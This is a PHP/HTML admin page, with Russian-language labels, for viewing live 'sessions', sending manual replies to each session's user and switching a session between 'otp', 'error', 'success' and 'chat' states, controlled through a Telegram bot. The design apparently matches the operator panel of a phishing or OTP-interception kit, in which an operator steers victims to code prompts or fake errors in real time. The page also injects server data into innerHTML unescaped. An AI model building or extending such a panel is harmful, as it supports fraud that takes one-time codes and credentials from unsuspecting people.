<?php
require_once __DIR__ . '/../config.php';

// Manual reply tool for testing without webhook
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Manual Reply Tool</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #002d62;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-size: 14px;
            box-sizing: border-box;
        }
        textarea {
            min-height: 100px;
            resize: vertical;
        }
        button {
            background: #002d62;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            font-weight: 600;
        }
        button:hover {
            background: #003d82;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 6px;
            display: none;
        }
        .result.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        .result.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        .sessions {
            margin-top: 30px;
            padding: 20px;
            background: #f9f9f9;
            border-radius: 6px;
        }
        .session-item {
            padding: 10px;
            margin: 5px 0;
            background: white;
            border-radius: 4px;
            cursor: pointer;
            border: 2px solid transparent;
        }
        .session-item:hover {
            border-color: #002d62;
        }
        .session-item code {
            background: #e0e0e0;
            padding: 2px 6px;
            border-radius: 3px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📊 Активные сессии</h1>
        <p style="color: #666; margin-bottom: 30px;">
            Просмотр активных сессий (управление только через Telegram бота)<br>
            <strong>Запустите бота:</strong> <code>php bot/polling.php</code>
        </p>
        
        <form id="replyForm" style="display: none;">
            <div class="form-group">
                <label for="sessionId">Chat ID (6 цифр):</label>
                <input type="text" id="sessionId" name="sessionId" placeholder="326652" maxlength="6" pattern="\d{6}" required>
            </div>
            
            <div class="form-group">
                <label for="message">Сообщение:</label>
                <textarea id="message" name="message" placeholder="Введите ваш ответ пользователю..." required></textarea>
            </div>
            
            <button type="submit">📤 Отправить ответ</button>
        </form>
        
        <div style="background: #fff3cd; padding: 20px; border-radius: 8px; margin: 20px 0; border: 1px solid #ffc107;">
            <h3 style="color: #856404; margin-bottom: 15px;">🤖 Управление через Telegram</h3>
            <p style="color: #856404;">
                Все управление сессиями происходит через Telegram бота.<br>
                Запустите polling скрипт в терминале:
            </p>
            <code style="background: white; padding: 10px; display: block; border-radius: 4px; color: #333; margin: 10px 0;">
                php bot/polling.php
            </code>
            <p style="color: #856404; margin-top: 10px; font-size: 13px;">
                После запуска бот будет получать обновления и обрабатывать команды
            </p>
        </div>
        
        <div class="result" id="result"></div>
        
        <div class="sessions">
            <h3>📋 Активные сессии:</h3>
            <div id="sessionsList">Загрузка...</div>
        </div>
    </div>
    
    <script>
        // Load active sessions
        function loadSessions() {
            fetch('/admin/get_active_sessions.php')
                .then(response => response.json())
                .then(data => {
                    const list = document.getElementById('sessionsList');
                    if (data.sessions && data.sessions.length > 0) {
                        list.innerHTML = '';
                        data.sessions.forEach(session => {
                            const div = document.createElement('div');
                            div.className = 'session-item';
                            div.innerHTML = `
                                <strong>${session.id}</strong><br>
                                <small>Статус: <code>${session.status}</code> | Сообщений: ${session.messages}</small><br>
                                <button onclick="changeStatus('${session.id}', 'otp')" style="font-size: 11px; padding: 4px 8px; margin-top: 5px; background: #ffc107; border: none; border-radius: 3px; cursor: pointer;">📱 OTP</button>
                                <button onclick="changeStatus('${session.id}', 'err')" style="font-size: 11px; padding: 4px 8px; margin-top: 5px; background: #dc3545; color: white; border: none; border-radius: 3px; cursor: pointer;">❌ Error</button>
                                <button onclick="changeStatus('${session.id}', 'ok')" style="font-size: 11px; padding: 4px 8px; margin-top: 5px; background: #28a745; color: white; border: none; border-radius: 3px; cursor: pointer;">✅ Success</button>
                                <button onclick="changeStatus('${session.id}', 'chat')" style="font-size: 11px; padding: 4px 8px; margin-top: 5px; background: #002d62; color: white; border: none; border-radius: 3px; cursor: pointer;">💬 Chat</button>
                            `;
                            div.onclick = () => {
                                document.getElementById('sessionId').value = session.id;
                            };
                            list.appendChild(div);
                        });
                    } else {
                        list.innerHTML = '<p style="color: #999;">Нет активных сессий</p>';
                    }
                })
                .catch(error => {
                    document.getElementById('sessionsList').innerHTML = '<p style="color: #dc3545;">Ошибка загрузки</p>';
                });
        }
        
        // Handle form submission
        document.getElementById('replyForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const sessionId = document.getElementById('sessionId').value.trim();
            const message = document.getElementById('message').value.trim();
            const resultDiv = document.getElementById('result');
            
            if (!sessionId || !message) {
                resultDiv.className = 'result error';
                resultDiv.textContent = 'Заполните все поля';
                resultDiv.style.display = 'block';
                return;
            }
            
            // Send reply
            fetch('/admin/send_admin_reply.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'session_id=' + encodeURIComponent(sessionId) + '&message=' + encodeURIComponent(message)
            })
            .then(response => response.json())
            .then(data => {
                resultDiv.style.display = 'block';
                if (data.success) {
                    resultDiv.className = 'result success';
                    resultDiv.textContent = '✅ Сообщение отправлено пользователю!';
                    document.getElementById('message').value = '';
                } else {
                    resultDiv.className = 'result error';
                    resultDiv.textContent = '❌ Ошибка: ' + (data.error || 'Неизвестная ошибка');
                }
            })
            .catch(error => {
                resultDiv.className = 'result error';
                resultDiv.textContent = '❌ Ошибка отправки';
                resultDiv.style.display = 'block';
            });
        });
        
        // Load sessions on page load
        loadSessions();
        
        // Refresh sessions every 5 seconds
        setInterval(loadSessions, 5000);
        
        // Change session status
        function changeStatus(sessionId, status) {
            if (!confirm('Изменить статус на "' + status + '"?')) return;
            
            fetch('/admin/change_status.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'session_id=' + encodeURIComponent(sessionId) + '&status=' + encodeURIComponent(status)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('✅ Статус изменен на: ' + status);
                    loadSessions();
                } else {
                    alert('❌ Ошибка: ' + (data.error || 'Неизвестная ошибка'));
                }
            })
            .catch(error => {
                alert('❌ Ошибка изменения статуса');
            });
        }
    </script>
</body>
</html>
